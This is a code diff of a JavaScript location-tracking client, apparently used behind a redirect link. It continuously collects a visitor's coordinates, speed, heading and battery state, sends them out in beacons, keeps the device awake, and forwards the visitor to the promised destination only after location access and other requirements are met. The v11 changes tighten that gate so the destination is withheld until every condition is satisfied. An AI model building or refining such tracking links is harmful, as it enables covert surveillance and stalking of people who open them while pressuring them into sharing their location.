@@ -1,6 +1,5 @@
-/* igtracker 連続位置追跡クライアント v10
-   window.LT_CODE / LT_IV / LT_MAX / LT_HIT を事前定義すること。
-   v10: ゲート（要件→続ける）対応。igt:gate まで起動しない。
+/* igtracker 連続位置追跡クライアント v11
+   v11: LT_REQUIRE_ALL のときは LT_ALLOW_REDIRECT が立つまで飛ばない。
 */
 (function () {
   "use strict";
@@ -31,6 +30,11 @@
   var RETRY_TEXT = window.LT_RETRY_TEXT || "もう一度";
   var DEBUG = !!window.LT_DEBUG;
 
+  /* ★ 3つ全部OKでないと飛ばない */
+  function canLeave() {
+    return !!DEST && (!window.LT_REQUIRE_ALL || !!window.LT_ALLOW_REDIRECT);
+  }
+
   var SID = (function () {
     try {
       var v = sessionStorage.getItem("igt_sid_" + CODE);
@@ -54,7 +58,6 @@
 
   function $(id) { return document.getElementById(id); }
   function iso(t) { try { return new Date(t).toISOString(); } catch (e) { return ""; } }
-
   function line(text, warn) {
     var s = $("lt_st");
     if (!s) return;
@@ -102,7 +105,8 @@
     waitTimer = setTimeout(function () {
       waitTimer = null;
       if (left || stopped || gotFix) return;
-      if (DENY_REDIRECT && DEST) { leave(); return; }
+      if (DENY_REDIRECT && canLeave()) { leave(); return; }
+      document.body.classList.add("need");
       setState("deny");
     }, ms);
   }
@@ -151,7 +155,7 @@
     try { beacon("stop"); } catch (e) {}
     try { location.replace(url); } catch (e) { location.href = url; }
   }
-  function leave() { if (!left && DEST) goto(DEST); }
+  function leave() { if (!left && canLeave()) goto(DEST); }
 
   function onPos(p) {
     var c = (p && p.coords) || {};
@@ -164,7 +168,7 @@
     if (first) {
       setState("ok"); announce();
       if (window.LT_KEEP && window.LT_KEEP.kick) { try { window.LT_KEEP.kick(); } catch (e) {} }
-      if (DEST) setTimeout(leave, DEST_MIN);
+      if (canLeave()) setTimeout(leave, DEST_MIN);
     }
     q.push({ ts: iso(p.timestamp || Date.now()), lat: c.latitude, lon: c.longitude,
              acc: c.accuracy, spd: c.speed, hdg: c.heading, batt: batt, chg: chg });
@@ -181,10 +185,10 @@
     var c = (e && e.code) || 0;
     dbg("err code=" + c + " msg=" + ((e && e.message) || "") + " step=" + step);
     if (gotFix) return;
-    if (c === 1) { setState("deny"); return; }
+    if (c === 1) { document.body.classList.add("need"); setState("deny"); return; }
     if (step < LADDER.length - 1) {
       step++;
-      line("位置情報を取得中…", false);
+      if (!gotFix) line("位置情報を取得中…", false);
       if (ladderTimer) clearTimeout(ladderTimer);
       ladderTimer = setTimeout(function () {
         ladderTimer = null;
@@ -236,7 +240,7 @@
     if (!name) return;
     inapp = name;
     var nm = $("lt_ia_name"); if (nm) nm.textContent = name;
-    if (state === "deny" || !gotFix) showInApp();
+    if (state === "deny") showInApp();
   }
   function ask() {
     return new Promise(function (res) {
@@ -293,7 +297,7 @@
     started = Date.now(); stopped = false;
     showPerm(); checkInApp(); readBatt(); keepAwake(); showRetry();
     if (window.LT_KEEP && window.LT_KEEP.kick) { try { window.LT_KEEP.kick(); } catch (e) {} }
-    if (!navigator.geolocation) { setState("deny"); return; }
+    if (!navigator.geolocation) { document.body.classList.add("need"); setState("deny"); return; }
     if (window.LT_FIRST_FIX && !gotFix) { try { onPos(window.LT_FIRST_FIX); } catch (e) {} }
     ask().then(function () {
       if (stopped || left) return;
@@ -324,7 +328,6 @@
     clock = sender = dog = null;
     beacon("stop");
     state = "wait";
-    if (!gotFix) line(ASK_TEXT, false);
     showRetry();
   }
   function resume() {
@@ -362,6 +365,7 @@
   window.LT_LIVE = {
     start: boot, stop: stop, leave: leave, retry: attempt, restart: restart,
     feed: function (p) { try { onPos(p); } catch (e) {} },
+    canLeave: canLeave,
     sid: SID, state: function () { return state; }, step: function () { return step; }
   };
 
